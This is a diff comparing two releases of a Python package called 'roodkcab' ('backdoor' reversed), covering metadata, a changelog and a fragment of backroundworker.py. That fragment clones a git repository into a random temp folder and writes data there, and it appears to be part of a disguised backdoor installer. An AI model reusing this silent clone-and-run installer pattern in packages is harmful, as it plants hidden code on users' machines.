# Comparing `tmp/roodkcab-2.8.tar.gz` & `tmp/roodkcab-2.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "roodkcab-2.8.tar", last modified: Sun Jul  2 15:50:44 2023, max compression
+gzip compressed data, was "roodkcab-2.9.tar", last modified: Sun Jul  2 16:00:51 2023, max compression
```

## Comparing `roodkcab-2.8.tar` & `roodkcab-2.9.tar`

### file list

```diff
@@ -1,19 +1,19 @@
-drwxrwxrwx   0        0        0        0 2023-07-02 15:50:44.512843 roodkcab-2.8/
--rw-rw-rw-   0        0        0     1014 2023-07-01 13:36:48.000000 roodkcab-2.8/LICENSE
--rw-rw-rw-   0        0        0      909 2023-07-02 15:50:44.511836 roodkcab-2.8/PKG-INFO
--rw-rw-rw-   0        0        0      398 2023-07-02 15:50:28.000000 roodkcab-2.8/README.md
--rw-rw-rw-   0        0        0      690 2023-07-02 15:49:57.000000 roodkcab-2.8/pyproject.toml
--rw-rw-rw-   0        0        0       42 2023-07-02 15:50:44.513844 roodkcab-2.8/setup.cfg
-drwxrwxrwx   0        0        0        0 2023-07-02 15:50:44.468007 roodkcab-2.8/src/
-drwxrwxrwx   0        0        0        0 2023-07-02 15:50:44.500244 roodkcab-2.8/src/roodkcab/
--rw-rw-rw-   0        0        0        0 2023-07-01 19:55:25.000000 roodkcab-2.8/src/roodkcab/__init__.py
--rw-rw-rw-   0        0        0     2605 2023-07-02 13:39:31.000000 roodkcab-2.8/src/roodkcab/backroundworker.py
--rw-rw-rw-   0        0        0      288 2023-07-02 13:41:13.000000 roodkcab-2.8/src/roodkcab/data.py
--rw-rw-rw-   0        0        0     1225 2023-07-02 11:57:12.000000 roodkcab-2.8/src/roodkcab/filehelper.py
--rw-rw-rw-   0        0        0     1948 2023-07-02 12:10:37.000000 roodkcab-2.8/src/roodkcab/gitHelper.py
-drwxrwxrwx   0        0        0        0 2023-07-02 15:50:44.510330 roodkcab-2.8/src/roodkcab.egg-info/
--rw-rw-rw-   0        0        0      909 2023-07-02 15:50:44.000000 roodkcab-2.8/src/roodkcab.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      342 2023-07-02 15:50:44.000000 roodkcab-2.8/src/roodkcab.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-02 15:50:44.000000 roodkcab-2.8/src/roodkcab.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       37 2023-07-02 15:50:44.000000 roodkcab-2.8/src/roodkcab.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-07-02 15:50:44.000000 roodkcab-2.8/src/roodkcab.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.407151 roodkcab-2.9/
+-rw-rw-rw-   0        0        0     1014 2023-07-01 13:36:48.000000 roodkcab-2.9/LICENSE
+-rw-rw-rw-   0        0        0      929 2023-07-02 16:00:51.405152 roodkcab-2.9/PKG-INFO
+-rw-rw-rw-   0        0        0      399 2023-07-02 15:51:11.000000 roodkcab-2.9/README.md
+-rw-rw-rw-   0        0        0      709 2023-07-02 16:00:32.000000 roodkcab-2.9/pyproject.toml
+-rw-rw-rw-   0        0        0       42 2023-07-02 16:00:51.407151 roodkcab-2.9/setup.cfg
+drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.380097 roodkcab-2.9/src/
+drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.395627 roodkcab-2.9/src/roodkcab/
+-rw-rw-rw-   0        0        0        0 2023-07-01 19:55:25.000000 roodkcab-2.9/src/roodkcab/__init__.py
+-rw-rw-rw-   0        0        0     2613 2023-07-02 16:00:02.000000 roodkcab-2.9/src/roodkcab/backroundworker.py
+-rw-rw-rw-   0        0        0      287 2023-07-02 15:54:51.000000 roodkcab-2.9/src/roodkcab/data.py
+-rw-rw-rw-   0        0        0     1225 2023-07-02 11:57:12.000000 roodkcab-2.9/src/roodkcab/filehelper.py
+-rw-rw-rw-   0        0        0     1948 2023-07-02 12:10:37.000000 roodkcab-2.9/src/roodkcab/gitHelper.py
+drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.403152 roodkcab-2.9/src/roodkcab.egg-info/
+-rw-rw-rw-   0        0        0      929 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      342 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       37 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/top_level.txt
```

### Comparing `roodkcab-2.8/LICENSE` & `roodkcab-2.9/LICENSE`

 * *Files identical despite different names*

### Comparing `roodkcab-2.8/PKG-INFO` & `roodkcab-2.9/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 Metadata-Version: 2.1
 Name: roodkcab
-Version: 2.8
-Summary: Bugfix ('See Changelog')
+Version: 2.9
+Summary: Tryed Fixing import Bug inside the package!
 Author-email: LuxxDEV <lkgames256@gmail.com>
 Project-URL: Homepage, https://github.com/lkgames256/roodkcab
 Project-URL: Bug Tracker, https://github.com/lkgames256/roodkcab/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.9
@@ -18,12 +18,12 @@
 
 Oky i am way to lazy to write anithyng here during testing so if i got to actual pypi the i will.
 
 1. Updated test.ps1 to include while true >> To keep the programm running. **26.06.2023 18:21:00**
 
 2. Rewritten Every code for pip package => **I DIDIN'T delete the code ...**
 
-3. Removed threading module from dependencies
+3. Removed threading module from dependencies 
 
 ## USAGE
 
 1. May be coming soon...
```

### Comparing `roodkcab-2.8/pyproject.toml` & `roodkcab-2.9/pyproject.toml`

 * *Files 6% similar despite different names*

```diff
@@ -2,19 +2,19 @@
 requires = [
     "setuptools>=61.0"
 ]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "roodkcab"
-version = "2.8"
+version = "2.9"
 authors = [
   { name="LuxxDEV", email="lkgames256@gmail.com" },
 ]
-description = "Bugfix ('See Changelog')"
+description = "Tryed Fixing import Bug inside the package!"
 readme = "README.md"
 requires-python = ">=3.9"
 classifiers = [
     "Programming Language :: Python :: 3",
     "License :: OSI Approved :: MIT License",
     "Operating System :: OS Independent",
 ]
```

### Comparing `roodkcab-2.8/src/roodkcab/backroundworker.py` & `roodkcab-2.9/src/roodkcab/backroundworker.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 import configparser
 import os
 import socket
 import requests
 import uuid
 import datetime
-import gitHelper
+from .gitHelper import *
 
 
 def installer():
     random_id = uuid.uuid4()
     gitHelper.clone(url="", clone_path=os.getenv("TMP") + f"\installerroodkcab{random_id}")
     os.chdir(os.getenv("TMP") + f"\installerroodkcab{random_id}")
     write_data(random_id=random_id)
```

### Comparing `roodkcab-2.8/src/roodkcab/filehelper.py` & `roodkcab-2.9/src/roodkcab/filehelper.py`

 * *Files identical despite different names*

### Comparing `roodkcab-2.8/src/roodkcab/gitHelper.py` & `roodkcab-2.9/src/roodkcab/gitHelper.py`

 * *Files identical despite different names*

### Comparing `roodkcab-2.8/src/roodkcab.egg-info/PKG-INFO` & `roodkcab-2.9/src/roodkcab.egg-info/PKG-INFO`

 * *Files 8% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 Metadata-Version: 2.1
 Name: roodkcab
-Version: 2.8
-Summary: Bugfix ('See Changelog')
+Version: 2.9
+Summary: Tryed Fixing import Bug inside the package!
 Author-email: LuxxDEV <lkgames256@gmail.com>
 Project-URL: Homepage, https://github.com/lkgames256/roodkcab
 Project-URL: Bug Tracker, https://github.com/lkgames256/roodkcab/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.9
@@ -18,12 +18,12 @@
 
 Oky i am way to lazy to write anithyng here during testing so if i got to actual pypi the i will.
 
 1. Updated test.ps1 to include while true >> To keep the programm running. **26.06.2023 18:21:00**
 
 2. Rewritten Every code for pip package => **I DIDIN'T delete the code ...**
 
-3. Removed threading module from dependencies
+3. Removed threading module from dependencies 
 
 ## USAGE
 
 1. May be coming soon...
```

